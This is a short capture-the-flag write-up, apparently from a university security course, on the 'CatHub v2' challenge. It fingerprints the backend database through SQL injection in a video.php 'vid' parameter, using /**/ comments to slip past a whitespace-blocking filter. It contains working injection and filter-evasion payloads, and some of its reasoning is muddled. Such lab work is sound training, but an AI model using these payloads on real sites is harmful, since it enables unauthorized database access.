# CatHub v2 solution step by step

## Step 1. DB syntax comparison

DB Type | LIMIT  | IF     | SLEEP  | OR     | AND    | *      | +      | #      | /**/   | --     |
--------|:------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|
MySQL   |   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
MSSQL   |  TOP   |   O    |  DELAY | O      |  O     |  O     | STRCAT | X      |   O    |  O    |
OracleDB|   ?    |   O    | dbms_lock.sleep(sec) | O      |  O     |  O     |  O     | X      |   X    |  O     |

## Step 2 trial and error to determine DB type

### White space banned

`https://edu-ctf.csie.org:10159/video.php?vid=1%20SLEEP(3)` does not work (waf protection for space characters) --> bad cat!, hence we need to use comment to separate commands. 

### Check function

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/TOP/**/1` --> error!: TOP unusable --> OracleDB(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/DELAY(25)` --> error!: DELAY unusable --> MSSQL(X)
### Check comments where usable ones are # -- /**/ 

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1/**/ljfberwhkfjhwbe`  --> error!: /**/ Usable --> OracleDB(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1#ljfberwhkfjhwbe`  --> no error!: # Usable --> MSSQL(X), PorstgreSQL(X), SQLite(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1--ljfberwhkfjhwbe`  --> no error!: -- Usable

Finally we can determine the DB Kaibro uses is MariaDB  